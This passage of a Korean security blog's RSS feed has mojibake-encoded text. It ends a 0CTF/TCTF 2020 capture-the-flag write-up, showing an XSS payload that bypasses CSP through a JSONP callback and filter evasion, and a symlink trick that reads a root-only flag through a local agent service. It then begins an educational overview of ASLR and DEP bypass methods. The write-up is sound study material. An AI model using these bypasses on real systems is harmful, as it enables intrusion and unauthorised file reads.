&lt;p&gt;í•˜ì§€ë§Œ ì›¹ ì„œë¹„ìŠ¤ì˜ javascriptë¥¼ ì „ë¶€ ì°¾ì•„ë³´ì•˜ì§€ë§Œ Callback í•¨ìˆ˜ëŠ” ì¡´ì¬í•˜ì§€ ì•Šì•˜ê³  ë°˜ì‹ ë°˜ì˜ í•˜ë©°  ì•„ë˜ì™€ ê°™ì´ ìš”ì²­ì„ í•œ ê²°ê³¼ callback í•¨ìˆ˜ì²˜ëŸ¼ ë³€í™˜í•´ì£¼ëŠ” ê¸°ëŠ¥ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pwnable.org:5000/image/mZdWjn/png?callback=xxx

xxx={&quot;error&quot;: &quot;Convert exception: unable to open image `previews/&quot;+alert(1)+&quot;': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ìŠ¤í¬ë¦½íŠ¸ íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ CSPë¥¼ ìš°íšŒ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ src ë˜í•œ ê³µë°±ìœ¼ë¡œ ì¹˜í™˜í•˜ê¸° ë•Œë¬¸ì— srsrccë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°íšŒí–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script srsrcc='/image/mZdWjn/png?callback=xxx'&amp;gt;&amp;lt;script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;alertì„-ì‹¤í–‰í–ˆì§€ë§Œ-flag-ì¸ì¦ê¹Œì§€-í•œ-ì‹œê°„ì´-ë”-ì†Œìš”ëœ-ì´ì•¼ê¸°&quot;&gt;alertì„ ì‹¤í–‰í–ˆì§€ë§Œ FLAG ì¸ì¦ê¹Œì§€ í•œ ì‹œê°„ì´ ë” ì†Œìš”ëœ ì´ì•¼ê¸°&lt;/h3&gt;

&lt;p&gt;FLAGë¥¼ ì£¼ëŠ” ì‹œí¬ë¦¿ í˜ì´ì§€ì—ì„œ alert(1)ì´ ì‹¤í–‰ë˜ëŠ” URLì„ ì œì¶œ í–ˆì§€ë§Œ FLAGë¥¼ ë°›ì„ ìˆ˜ ì—†ì—ˆê³  ë” ì—´ì‹¬íˆ í•˜ë¼ëŠ” ë‚´ìš©ì´ ì¶œë ¥ëìŠµë‹ˆë‹¤. ë¬¸ì œë¥¼ ì°¾ì„ ìˆ˜ ì—†ì–´ì„œ ê³„ì† ìŠ¤í¬ë¦½íŠ¸ë„ ë°”ê¿”ë³´ê³  ì½˜ì†”ì°½ì— ë°œìƒí•˜ëŠ” ëª¨ë“  ì—ëŸ¬ë¥¼ ì§€ìš¸ ìˆ˜ ìˆë„ë¡ í•´ë´¤ì§€ë§Œ í•´ê²°ì´ ë˜ì§€ ì•Šì•„ì„œ IRCì— ì ‘ì†í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¤í–‰íˆë„ ì¹œì ˆí•œ ADMINì´ FLAGë¥¼ ì£¼ëŠ” ë´‡ì€ ì™¸ë¶€ì—ì„œ ì ‘ì†ì´ ë˜ì§€ ì•Šìœ¼ë©° BASE URLì´ ë‹¤ë¥¼ ìˆ˜ ìˆë‹¤ëŠ” ì´ì•¼ê¸°ë¥¼ í•´ì¤¬ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script srsrcc='http://pwnable.org:5000/image/mZdWjn/png?callback=xxx'&amp;gt;&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ì²˜ìŒì—ëŠ” ìœ„ì™€ ê°™ì´ BASE ì„œë²„ ì£¼ì†Œê°€ í¬í•¨ëœ URLì„ ìš”ì²­ í–ˆê¸° ë•Œë¬¸ì— ì„œë²„ì—ì„œ alert(1)ì´ ì‹¤í–‰ë˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì— í•œ ì‹œê°„ì´ ë„˜ëŠ” ì‹œê°„ì´ ì´ìƒí•œ ì‚½ì§ˆì— ì“°ì´ê²Œ ëìŠµë‹ˆë‹¤. ë‹¤ìŒë¶€í„°ëŠ” ê¼­ ì¸ì§€í•´ì•¼í•  ê²ƒ ê°™ìŠµë‹ˆë‹¤^^&lt;/p&gt;

&lt;h2 id=&quot;cloud-computing-v2&quot;&gt;Cloud Computing v2&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Misc (Web + Reversing)
275 Pts
18 solved&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Cloud Computing v2 ë¬¸ì œëŠ” Cloud Computing ë¬¸ì œì™€ëŠ” ë‹¤ë¥´ê²Œ flagê°€ ë£¨íŠ¸ ê¶Œí•œì—ì„œë§Œ ì½ì„ ìˆ˜ ìˆê²Œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ flagë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ì„œë¹„ìŠ¤ê°€ ìˆì„ ê²ƒì´ë¼ê³  ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Cloud Computingì˜ ë¬¸ì œì—ì„œ open_basedirì„ ìš°íšŒí•˜ì—¬ ë£¨íŠ¸ í´ë”ë¥¼ ë³´ë©´ ì´ìƒí•œ agentë¼ëŠ” ë°”ì´ë„ˆë¦¬ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;agent ë°”ì´ë„ˆë¦¬ëŠ” Echoë¼ëŠ” go ì–¸ì–´ì˜ ì›¹ í”„ë ˆì„ì›Œí¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‘ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;go ì–¸ì–´ë¥¼ IDAë¡œ ë¶„ì„í•˜ê¸° ìœ„í•´ì„œ IDAPython ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/strazzere/golang_loader_assist&quot;&gt;https://github.com/strazzere/golang_loader_assist&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ì˜ ìµœì‹  ìŠ¤í¬ë¦½íŠ¸ëŠ” IDA Pro 7.4 ì´í›„ Python3 ë²„ì „ì—ì„œ ë™ì‘í•˜ë„ë¡ ë§Œë“¤ì–´ì ¸ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ IDA Pro 7.2ë¥¼ ì‚¬ìš©í•˜ëŠ” ì €ëŠ” ì´ì „ commitì„ ë³´ê³  ê³¼ê±° ë²„ì „ì—ì„œ ë™ì‘í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì°¾ì•„ ì‹¤í–‰ì‹œì¼°ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;(&lt;a href=&quot;https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py&quot;&gt;https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;main_main í•¨ìˆ˜ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:80&lt;/code&gt;ë¡œ Echo ì„œë²„ë¥¼ ì‹œì‘í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì•„ë˜ì™€ ê°™ì´ ë¼ìš°íŒ… ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/init&lt;/code&gt; â‡’ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_init&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/read&lt;/code&gt; â‡’ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_read&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/scan&lt;/code&gt; â‡’ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_scan&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3ê°€ì§€ End-PointëŠ” ëª¨ë‘ dirì„ ì¸ìë¡œ ë°›ìœ¼ë©° dirì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;^/var/www/html/sandbox/[0-9a-f]{40}/&lt;/code&gt; ì •ê·œì‹ ê²€ì‚¬ë¥¼ í•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_init&lt;/code&gt; í•¨ìˆ˜ëŠ” ì£¼ì–´ì§„ dirì— &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;ban&quot;: &quot;flag&quot;}&lt;/code&gt; ë‚´ìš©ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;config.json&lt;/code&gt; íŒŒì¼ì„ ìƒì„±í•´ì£¼ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_read&lt;/code&gt; í•¨ìˆ˜ëŠ” ì£¼ì–´ì§„ dirì— &lt;code class=&quot;highlighter-rouge&quot;&gt;config.json&lt;/code&gt; íŒŒì¼ì„ ì½ì–´ì„œ ban ë‚´ìš©ì„ í™•ì¸í•˜ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;ì¸ìë¡œ ë„˜ì–´ì˜¨ ê²½ë¡œë¥¼ ì½ì–´ì£¼ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. ì½ì€ ë‚´ìš©ì€ Base64ë¡œ ì¸ì½”ë”©í•˜ì—¬ ì¶œë ¥í•´ì¤ë‹ˆë‹¤. ë‹¨ banì— ìˆëŠ” ë‚´ìš©ì¤‘ í•œê¸€ìë¼ë„ ì¼ì¹˜í•˜ê²Œ ë˜ë©´ íŒŒì¼ì„ ì½ì–´ì£¼ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_scan&lt;/code&gt; í•¨ìˆ˜ëŠ” ì£¼ì–´ì§„ dirì— ìˆëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;*.php&lt;/code&gt; íŒŒì¼ë“¤ì˜ ë‚´ìš©ì„ ì´ˆê¸°í™” í•´ì£¼ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ê³¼ì •ì„ í†µí•´ì„œ flagë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo file_get_contents(&quot;http://127.0.0.1/init?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&quot;);

symlink(&quot;/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.json&quot;, &quot;/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.php&quot;);

echo file_get_contents(&quot;http://127.0.0.1/scan?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&quot;);

echo file_get_contents(&quot;http://127.0.0.1/read?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&amp;amp;target=/flag&quot;);

successsuccessfile contents:ZmxhZ3tkYzZhNzNhZjA1MmM2MTM1YjRjNjM1NmE0YWFmMGI1OH0K //flag{dc6a73af052c6135b4c6356a4aaf0b58}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2</guid>
        
        <category>ctf</category>
        
        <category>writeup</category>
        
        <category>web</category>
        
        <category>reversing</category>
        
        
      </item>
    
      <item>
        <title>ë©”ëª¨ë¦¬ ë³´í˜¸ ê¸°ë²•</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì´ì˜ì£¼&lt;/p&gt;

&lt;h1 id=&quot;introduce&quot;&gt;Introduce&lt;/h1&gt;

&lt;p&gt;ë‹¤ì–‘í•œ í™˜ê²½ì—ì„œ ë©”ëª¨ë¦¬ ë³´í˜¸ê¸°ë²•ì„ ì¡°ì‚¬í•˜ì˜€ìŠµë‹ˆë‹¤. ë§ì€ ë©”ëª¨ë¦¬ ë³´í˜¸ê¸°ë²•ì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ê° ë³´í˜¸ê¸°ë²•ì— ëŒ€í•œ ìš°íšŒ ë°©ë²•ì— ëŒ€í•´ì„œëŠ” ê°„ëµí•˜ê²Œ ë‹¤ë¤˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;index&quot;&gt;INDEX&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;Window
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#73a693962691483db33d12abd37dd01e&quot;&gt;ASLR&lt;/a&gt; (Address Space Layout Randomization)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#16ded77354af43d7b3a4e68a9de83157&quot;&gt;DEP&lt;/a&gt; (Data Execution Prevention)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#f795063a5cf146e6bc288afa084c7a12&quot;&gt;GS&lt;/a&gt; (Buffer Security Check)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#44e39b1a09b84a2a850a6fe69410044b&quot;&gt;SafeSEH&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#44e39b1a09b84a2a850a6fe69410044b&quot;&gt;SEHOP&lt;/a&gt; (Structured Exception Handling Overwrite Protection)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#fc385b135a654dc58e9bc0294b18e65c&quot;&gt;CFG&lt;/a&gt; (Control Flow Guard)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#73a93686c5244a7f9d619c3cf4875ae7&quot;&gt;CIG&lt;/a&gt; (Code Integrity Guard)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#11dedb0ced4040d1a2b5138af6690d89&quot;&gt;ACG&lt;/a&gt; (Arbitrary Code Guard)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#9f160b1513d349e28dba45cb483156e8&quot;&gt;CET&lt;/a&gt; (Shadow stack, Indirect Branch Tracking)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Linux
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#73a693962691483db33d12abd37dd01e&quot;&gt;ASLR&lt;/a&gt;  (Address Space Layout Randomization)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#16ded77354af43d7b3a4e68a9de83157&quot;&gt;NX bit&lt;/a&gt; (Never eXecute bit)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#f795063a5cf146e6bc288afa084c7a12&quot;&gt;Stack Canary&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Kernel
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#278151249e3744f6941beec7f5c59143&quot;&gt;KASLR&lt;/a&gt; (Kernel Address Space Layout Randomization)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#d6e75e785d2d40da9dd3f40c9b402933&quot;&gt;SMEP&lt;/a&gt; (Supervisor Mode Execution Prevention)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#fc774b4317964bcc8a588bb5fb0d747c&quot;&gt;SMAP&lt;/a&gt; (Supervisor Mode Access Prevention)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;1-aslraddress-space-layout-randomization&quot;&gt;1. ASLR(Address Space Layout Randomization)&lt;/h2&gt;

&lt;p&gt;ASLRì€ ì‹¤í–‰íŒŒì¼ê³¼ ê´€ë ¨ëœ ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬, ìŠ¤íƒ, í™ì´ ë§¤í•‘ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì˜ ì£¼ì†Œë¥¼ ëœë¤ìœ¼ë¡œ ë°°ì¹˜í•˜ëŠ”ê²ƒì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìê°€ ê³ ì •ëœ ì£¼ì†Œë¥¼ ì´ìš©í•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ë³€ê²½í•˜ê±°ë‚˜ ì›í•˜ëŠ” ë°ì´í„°ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì„ ë§‰ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ASLRì€ Linux í™˜ê²½ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/self/maps&lt;/code&gt;ë¥¼ ì½ì–´ì„œ ê°€ì¥ ì‰½ê²Œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ì²«ë²ˆì§¸ ì‹¤í–‰&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;raon@raon:~/test$ cat /proc/self/maps
55abfd61b000-55abfd61d000 r--p 00000000 103:02 2752672                   /usr/bin/cat
55abfd61d000-55abfd622000 r-xp 00002000 103:02 2752672                   /usr/bin/cat
55abfd622000-55abfd625000 r--p 00007000 103:02 2752672                   /usr/bin/cat
55abfd625000-55abfd626000 r--p 00009000 103:02 2752672                   /usr/bin/cat
55abfd626000-55abfd627000 rw-p 0000a000 103:02 2752672                   /usr/bin/cat
55abfdf39000-55abfdf5a000 rw-p 00000000 00:00 0                          [heap]
7ff2b516f000-7ff2b5191000 rw-p 00000000 00:00 0 
7ff2b5191000-7ff2b5846000 r--p 00000000 103:02 2753788                   /usr/lib/locale/locale-archive
7ff2b5846000-7ff2b586b000 r--p 00000000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7ff2b586b000-7ff2b59e3000 r-xp 00025000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7ff2b59e3000-7ff2b5a2d000 r--p 0019d000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7ff2b5a2d000-7ff2b5a30000 r--p 001e6000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7ff2b5a30000-7ff2b5a33000 rw-p 001e9000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7ff2b5a33000-7ff2b5a39000 rw-p 00000000 00:00 0 
7ff2b5a4e000-7ff2b5a4f000 r--p 00000000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7ff2b5a4f000-7ff2b5a71000 r-xp 00001000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7ff2b5a71000-7ff2b5a79000 r--p 00023000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7ff2b5a7a000-7ff2b5a7b000 r--p 0002b000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7ff2b5a7b000-7ff2b5a7c000 rw-p 0002c000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7ff2b5a7c000-7ff2b5a7d000 rw-p 00000000 00:00 0 
7ffd5fbf9000-7ffd5fc1b000 rw-p 00000000 00:00 0                          [stack]
7ffd5fd14000-7ffd5fd17000 r--p 00000000 00:00 0                          [vvar]
7ffd5fd17000-7ffd5fd18000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ë‘ë²ˆì§¸ ì‹¤í–‰&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;raon@raon:~/test$ cat /proc/self/maps
56196357a000-56196357c000 r--p 00000000 103:02 2752672                   /usr/bin/cat
56196357c000-561963581000 r-xp 00002000 103:02 2752672                   /usr/bin/cat
561963581000-561963584000 r--p 00007000 103:02 2752672                   /usr/bin/cat
561963584000-561963585000 r--p 00009000 103:02 2752672                   /usr/bin/cat
561963585000-561963586000 rw-p 0000a000 103:02 2752672                   /usr/bin/cat
561964938000-561964959000 rw-p 00000000 00:00 0                          [heap]
7fe9c9dbe000-7fe9c9de0000 rw-p 00000000 00:00 0 
7fe9c9de0000-7fe9ca495000 r--p 00000000 103:02 2753788                   /usr/lib/locale/locale-archive
7fe9ca495000-7fe9ca4ba000 r--p 00000000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca4ba000-7fe9ca632000 r-xp 00025000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca632000-7fe9ca67c000 r--p 0019d000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca67c000-7fe9ca67f000 r--p 001e6000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca67f000-7fe9ca682000 rw-p 001e9000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca682000-7fe9ca688000 rw-p 00000000 00:00 0 
7fe9ca69d000-7fe9ca69e000 r--p 00000000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca69e000-7fe9ca6c0000 r-xp 00001000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6c0000-7fe9ca6c8000 r--p 00023000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6c9000-7fe9ca6ca000 r--p 0002b000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6ca000-7fe9ca6cb000 rw-p 0002c000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6cb000-7fe9ca6cc000 rw-p 00000000 00:00 0 
7ffe55212000-7ffe55234000 rw-p 00000000 00:00 0                          [stack]
7ffe5539a000-7ffe5539d000 r--p 00000000 00:00 0                          [vvar]
7ffe5539d000-7ffe5539e000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ê²°ê³¼ë¥¼ í†µí•´ ì‹¤í–‰íŒŒì¼(&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/cat&lt;/code&gt;), ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬, ìŠ¤íƒ, í™ì´ ì ì¬ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì´ ë§¤ë²ˆ ë°”ë€ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ê¸°ë²•ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ëŒ€í‘œì ì¸ ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Brute Force : ì£¼ë¡œ ì˜ˆì¸¡í•´ì•¼ í•˜ëŠ” ì£¼ì†Œ ê¸¸ì´ê°€ ì‘ì€ x86 ì‹¤í–‰íŒŒì¼ì—ì„œ ì‚¬ìš©ë˜ë©° ë™ì  í• ë‹¹ë˜ëŠ” heap ì˜ì—­ì„ ì´ìš©í•˜ëŠ” ê²½ìš°ê°€ ë§ìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì„ í†µí•´ í™•ë¥ ì ìœ¼ë¡œ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;Memory Leak : ASLRì˜ ê²½ìš° ë©”ëª¨ë¦¬ ì˜ì—­ì´ ë§¤ë²ˆ ë³€ê²½ë˜ëŠ” ê²ƒì´ë¯€ë¡œ Memory Leak ì·¨ì•½ì ì„ í†µí•´ íŠ¹ì • ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤ë©´ offset ê³„ì‚°ì„ í†µí•´ ê·¸ ë©”ëª¨ë¦¬ ì˜ì—­ì— ìˆëŠ” ë‹¤ë¥¸ ì£¼ì†Œë“¤ë„ ì˜ˆì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;2-depdata-execution-prevention--nxno-execute-bit&quot;&gt;2. DEP(Data Execution Prevention) / NX(No-Execute) bit&lt;/h2&gt;

&lt;p&gt;DEP/NXëŠ” ì‹¤í–‰ ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì˜ì—­ì´ ì•„ë‹Œ ìŠ¤íƒ, í™ê³¼ ê°™ì€ ì˜ì—­ì—ì„œ ì½”ë“œê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ ë§‰ëŠ” ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ë„ ASLR ì²˜ëŸ¼ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” ë³´í˜¸ê¸°ë²•ì´ë©° ê³µê²©ìê°€ í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆì„ë•Œ exploitì„ ì–´ë µê²Œ ë§Œë“­ë‹ˆë‹¤. ì´ë¥¼ ìœˆë„ìš°ì—ì„œëŠ” DEPë¼ê³  ë¶€ë¥´ë©° OS Xë‚˜ ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” NX bitë¼ê³  ë¶€ë¦…ë‹ˆë‹¤. ì´ëŠ” ASLRê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ë©”ëª¨ë¦¬ ë§µì„ í†µí•´ ì–´ë–»ê²Œ ì ìš©ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;raon@raon:~/test$ cat /proc/self/maps
56196357a000-56196357c000 r--p 00000000 103:02 2752672                   /usr/bin/cat
